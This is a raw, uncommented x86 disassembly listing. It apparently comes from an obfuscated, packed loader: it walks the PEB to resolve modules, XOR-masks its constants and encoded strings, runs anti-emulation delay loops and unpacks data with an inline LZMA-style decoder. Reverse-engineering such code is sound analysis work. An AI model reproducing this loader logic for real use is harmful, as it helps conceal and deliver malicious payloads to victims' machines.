  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
